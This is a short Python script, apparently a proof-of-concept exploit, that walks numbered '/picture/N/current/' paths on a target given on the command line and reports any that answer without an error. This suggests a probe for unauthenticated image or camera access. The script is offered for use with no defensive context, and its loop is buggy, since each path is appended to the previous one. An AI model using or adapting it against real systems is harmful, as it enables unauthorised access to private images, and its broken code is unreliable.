import sys
import requests
def exp(url):
    for i in range(1,100):
        if url[-1] == "/":
            url = url + "picture/{0}/current/".format(i)
        else:
            url = url + "/picture/{0}/current/".format(i)
        rus = requests.get(url, verify=False)
        if "error" not in rus.text:
            print("allow:{0}".format(url))
            break

if __name__ == '__main__':
    ip = sys.argv[1]
    print("teting...IP:{0}".format(ip))
    exp(ip)
